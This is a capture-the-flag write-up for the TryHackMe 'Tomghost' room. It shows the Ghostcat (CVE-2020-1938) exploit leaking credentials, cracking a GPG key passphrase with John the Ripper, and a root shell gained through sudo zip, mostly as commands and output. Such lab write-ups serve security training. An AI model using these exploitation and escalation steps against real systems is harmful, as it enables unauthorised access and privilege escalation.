---
title: Tomghost
description: 'Exploiting Tomcat v9.0.30 (CVE-2020-1938) and privilege escalation through the zip binary with sudo permissions'
pubDate: 2023-06-30
category: 'tryhackme'
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/016dea7c96e8b422241016405b571c8b.jpeg'
---

Getting the Tomcat version:
```bash
curl -s http://10.10.190.59:8080/docs/ | grep Tomcat
```

It reveals that its version 9.0.30 which is vulnerable to CVE-2020-1938.

## USER

```bash
python2 CVE-2020-1938.py 10.10.190.59
Getting resource at ajp13://10.10.190.59:8009/asdf
...[snip]...
<display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

```

We can SSH in with the user `skyfuck` and password `8730281lkjlkjdqlksalks`.

In the `/home/merlin` folder we can read the `user.txt` flag.

## ROOT

In the `skyfuck` user folder we find a `credential.pgp` and a `tryhackme.asc` file.
We can load the `tryhackme.asc` private key in PGP:

```bash
gpg --import tryhackme.asc
```

And then decrypt the `credential.gpg` file:

```bash
skyfuck@ubuntu:~$ gpg -d credential.pgp

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
Enter passphrase:
```

It asks for a password which we dont have, we need to crack the private key first.
So on our local machine we convert it to a format we can use with John the Ripper.

```bash
gpg2john tryhackme.asc > hash
```

hash file:
```
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc
```

Then we can crack the hash:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
...[snip]...
alexandru        (tryhackme)
...[snip]...
```

Now we can use this password to decrypt the `credential.pgp` file on the remote machine.

```bash
skyfuck@ubuntu:~$ gpg -d credential.pgp # <- Using the password `alexandru`
...[snip]...
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

With this password we can SSH as the `merlin` user.

Checking sudo rights for the `merlin` user:
```bash
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

```bash
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo /usr/bin/zip $TF /etc/hosts -T -TT 'sh #'
    adding: etc/hosts (deflated 31%)
# id
uid=0(root) gid=0(root) groups=0(root)
```
